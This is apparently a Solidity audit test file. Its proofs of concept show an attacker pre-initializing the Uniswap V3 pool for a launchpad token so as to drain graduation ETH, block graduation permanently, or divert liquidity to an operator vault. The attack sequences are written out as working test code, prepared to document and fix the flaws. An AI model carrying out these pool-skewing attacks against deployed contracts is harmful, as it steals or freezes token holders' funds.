// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {MindToken} from "../../src/MindToken.sol";
import {UniswapV3Graduator} from "../../src/UniswapV3Graduator.sol";
import {IMindLaunchpad} from "../../src/interfaces/IMindLaunchpad.sol";
import {MockWETH9} from "../mocks/MockWETH9.sol";
import {BaseTest} from "../utils/BaseTest.sol";
import {AuditFactory, AuditPool, AuditPositionManager} from "./mocks/AuditUniV3.sol";

/// @notice AUDIT PoCs for UniswapV3Graduator + MindLaunchpad.graduate against a pool that an attacker created and
///         initialized before graduation. Uses audit mocks with the real Uniswap v3 liquidity / swap math
///         (test/audit/mocks), unlike test/mocks/MockNonfungiblePositionManager which never yields zero liquidity.
///         Tests named test_POC_* assert the SAFE behaviour and are expected to FAIL against the current code.
contract AuditGraduatorSkewTest is BaseTest {
    uint24 internal constant FEE_TIER = 10_000;
    address internal constant WETH_LOW = address(0x1000); // WETH is token0
    address internal constant WETH_HIGH = address(0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF); // coin is token0

    AuditFactory internal factory;
    AuditPositionManager internal npm;
    MockWETH9 internal weth;
    UniswapV3Graduator internal graduator;
    address internal attacker = makeAddr("attacker");

    function setUp() public override {
        super.setUp();
        factory = new AuditFactory();
        npm = new AuditPositionManager(address(factory));
        factory.setManager(address(npm));
        vm.deal(attacker, 1 ether);
    }

    function _wire(address wethAt) internal {
        deployCodeTo("MockWETH9.sol:MockWETH9", wethAt);
        weth = MockWETH9(payable(wethAt));
        graduator = new UniswapV3Graduator(owner, address(launchpad), address(npm), address(factory), wethAt, FEE_TIER);
        vm.prank(owner);
        launchpad.setGraduator(address(graduator));
    }

    function _ethLiquidity(address token) internal view returns (uint256) {
        uint256 reserve = launchpad.getCurve(token).realEthReserve;
        return reserve - reserve * 250 / 10_000;
    }

    /// @dev Attacker dumps `amount` coins into the pool; returns WETH received.
    function _dump(address token, address pool, uint256 amount) internal returns (uint256 wethOut) {
        vm.startPrank(attacker);
        MindToken(token).approve(pool, amount);
        wethOut = AuditPool(pool).swapExactIn(token < address(weth), amount, attacker);
        vm.stopPrank();
    }

    // ---------------------------------------------------------------------------------------------
    // Control: honest graduation with the realistic mocks (passes)
    // ---------------------------------------------------------------------------------------------

    function test_control_freshPool_fairExit() public {
        _wire(WETH_LOW);
        address token = _createMind();
        uint256 got = _buy(attacker, token, 0.01 ether);
        _complete(alice, token);
        uint256 ethLiquidity = _ethLiquidity(token);
        launchpad.graduate(token);
        address pool = graduator.poolOf(token);
        assertApproxEqRel(weth.balanceOf(pool), ethLiquidity, 1e12, "pool holds the ETH liquidity");
        assertApproxEqRel(MindToken(token).balanceOf(pool), LP_SUPPLY, 1e12, "pool holds LP_SUPPLY");
        uint256 out = _dump(token, pool, got);
        // Fair constant-product exit of ~7.7M coins against 3.9 ETH / 200M coins: ~0.14 ETH.
        assertLt(out, 0.2 ether);
    }

    // ---------------------------------------------------------------------------------------------
    // C-1: pre-initialized pool at an inflated coin price => attacker drains the graduation ETH
    // ---------------------------------------------------------------------------------------------

    function test_POC_C1_preSkewedPoolDrainsGraduationEth_wethIsToken0() public {
        _wire(WETH_LOW);
        _theft();
    }

    function test_POC_C1_preSkewedPoolDrainsGraduationEth_coinIsToken0() public {
        _wire(WETH_HIGH);
        _theft();
    }

    function _theft() internal {
        address token = _createMind();
        uint256 attackerEthStart = attacker.balance;

        // 1. Attacker buys a few coins early (0.01 ETH -> ~7.7M coins).
        uint256 got = _buy(attacker, token, 0.01 ether);

        // 2. Attacker creates the WETH/coin 1% pool and initializes it at 1 coin == 1 WETH (sqrtPriceX96 = 2^96 in
        //    both orderings). No tokens needed; createPool/initialize are permissionless. This can even be done
        //    for future coin addresses (CREATE nonce of the launchpad is predictable).
        vm.startPrank(attacker);
        address pool = factory.createPool(token, address(weth), FEE_TIER);
        AuditPool(pool).initialize(uint160(1 << 96));
        vm.stopPrank();

        // 3. Victims complete the curve (alice pays ~4.04 ETH); anyone (the runner) graduates.
        _complete(alice, token);
        uint256 ethLiquidity = _ethLiquidity(token);
        launchpad.graduate(token);

        // The position took ~all the WETH but only ~3.9 coins; ~200M coins were burned.
        uint256 poolWeth = weth.balanceOf(pool);
        uint256 poolCoins = MindToken(token).balanceOf(pool);
        emit log_named_decimal_uint("pool WETH after graduation", poolWeth, 18);
        emit log_named_decimal_uint("pool coins after graduation", poolCoins, 18);
        emit log_named_decimal_uint("coins burned", MindToken(token).balanceOf(BURN), 18);

        // 4. Attacker dumps its cheap curve coins into the mispriced pool.
        uint256 wethOut = _dump(token, pool, got);
        uint256 profit = wethOut + attacker.balance - attackerEthStart;
        emit log_named_decimal_uint("ETH liquidity sent to the graduator", ethLiquidity, 18);
        emit log_named_decimal_uint("attacker WETH out", wethOut, 18);
        emit log_named_decimal_uint("attacker net profit (ETH)", profit, 18);

        // SAFE behaviour: the graduation liquidity cannot be extracted with ~0.01 ETH of coins.
        // A fair exit of the same coins is ~0.14 ETH (see test_control_freshPool_fairExit).
        assertLt(wethOut, 0.5 ether, "attacker drained the graduation liquidity through a pre-skewed pool");
    }

    // ---------------------------------------------------------------------------------------------
    // H-1: pool initialized at an extreme price => mint gets zero liquidity => graduation reverts forever
    // ---------------------------------------------------------------------------------------------

    /// @dev In-range extreme price (coin absurdly expensive): LiquidityAmounts' coin-side `toUint128` overflows.
    function test_POC_H1_extremeSkewBlocksGraduation_wethIsToken0() public {
        _wire(WETH_LOW);
        _dos(true);
    }

    function test_POC_H1_extremeSkewBlocksGraduation_coinIsToken0() public {
        _wire(WETH_HIGH);
        _dos(true);
    }

    /// @dev The exact edge prices used by test/UniswapV3Graduator.t.sol::test_graduate_extremelySkewedPool_neverReverts
    ///      (MIN_SQRT_RATIO + 1 / MAX_SQRT_RATIO - 1) on the WETH-only side: real Uniswap math gives liquidity 0 and
    ///      `UniswapV3Pool.mint` reverts. The existing test passes only because its mock never yields zero liquidity.
    function test_POC_H1_edgePriceFromExistingTestBlocksGraduation_wethIsToken0() public {
        _wire(WETH_LOW);
        _dos(false);
    }

    function test_POC_H1_edgePriceFromExistingTestBlocksGraduation_coinIsToken0() public {
        _wire(WETH_HIGH);
        _dos(false);
    }

    /// @dev Price where (at most) the WETH side would be deposited. WETH token0 => tiny token1/token0 price;
    ///      coin token0 => huge WETH-per-coin price. `inRange` picks 1e10 / 1e48 (inside the full range), otherwise
    ///      the existing test's MIN_SQRT_RATIO + 1 / MAX_SQRT_RATIO - 1 (outside it).
    function _wethOnlyPrice(address token, bool inRange) internal view returns (uint160) {
        bool wethIs0 = address(weth) < token;
        if (inRange) return wethIs0 ? uint160(1e10) : uint160(1e48);
        return wethIs0 ? uint160(4_295_128_739 + 1)
            : uint160(1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342 - 1);
    }

    function _dos(bool inRange) internal {
        address token = _createMind();
        // Attacker pre-skews the 1% pool AND the 0.3% pool (the owner's documented recovery is a new graduator).
        vm.startPrank(attacker);
        address pool = factory.createPool(token, address(weth), FEE_TIER);
        AuditPool(pool).initialize(_wethOnlyPrice(token, inRange));
        address pool3000 = factory.createPool(token, address(weth), 3000);
        AuditPool(pool3000).initialize(_wethOnlyPrice(token, inRange));
        vm.stopPrank();

        uint256 bought = _buy(alice, token, 10 ether); // completes the curve
        // Holders are frozen while Complete: no sells on the curve.
        vm.startPrank(alice);
        MindToken(token).approve(address(launchpad), bought);
        vm.expectRevert(IMindLaunchpad.WrongPhase.selector);
        launchpad.sell(token, bought, 0, block.timestamp);
        vm.stopPrank();

        (bool ok, bytes memory err) = address(launchpad).call(abi.encodeCall(IMindLaunchpad.graduate, (token)));
        emit log_named_string("graduate #1 succeeded", ok ? "yes" : "no");
        if (!ok) emit log_named_bytes("graduate #1 revert data", err);

        // Owner "recovery": wire a corrected graduator on another fee tier -> also blocked.
        UniswapV3Graduator g2 =
            new UniswapV3Graduator(owner, address(launchpad), address(npm), address(factory), address(weth), 3000);
        vm.prank(owner);
        launchpad.setGraduator(address(g2));
        (ok, err) = address(launchpad).call(abi.encodeCall(IMindLaunchpad.graduate, (token)));
        emit log_named_string("graduate #2 (new graduator, 0.3% tier) succeeded", ok ? "yes" : "no");

        // SPEC 2.4: "A pre-created or skewed pool never blocks graduation".
        assertEq(
            uint8(launchpad.getCurve(token).phase),
            uint8(IMindLaunchpad.CurvePhase.Graduated),
            "graduation permanently blocked by a pre-skewed pool; ~4 ETH of holders frozen"
        );
    }

    // ---------------------------------------------------------------------------------------------
    // H-2: pool initialized at a deflated coin price => the LP gets ~no ETH, the ETH goes to the mind vault
    // ---------------------------------------------------------------------------------------------

    function test_POC_H2_deflatedPoolDivertsLiquidityToVault() public {
        _wire(WETH_HIGH); // coin is token0: price = WETH per coin
        address token = _createMind();
        _complete(alice, token);
        uint256 ethLiquidity = _ethLiquidity(token);
        uint160 expected = uint160(Math.sqrt(Math.mulDiv(ethLiquidity, 1 << 192, LP_SUPPLY)));
        // 1000x cheaper coin (sqrt price / ~31.6).
        vm.startPrank(attacker);
        address pool = factory.createPool(token, address(weth), FEE_TIER);
        AuditPool(pool).initialize(expected / 32);
        vm.stopPrank();

        launchpad.graduate(token);
        emit log_named_decimal_uint("ETH liquidity sent to the graduator", ethLiquidity, 18);
        emit log_named_decimal_uint("pool WETH", weth.balanceOf(pool), 18);
        emit log_named_decimal_uint("ETH returned and credited to the mind vault", ethLiquidity - weth.balanceOf(pool), 18);

        // SAFE behaviour: (almost) all ETH liquidity ends up in the DEX pool, not in the operator-drawable vault.
        assertGe(weth.balanceOf(pool), ethLiquidity * 90 / 100, "graduation ETH diverted away from the LP");
    }
}
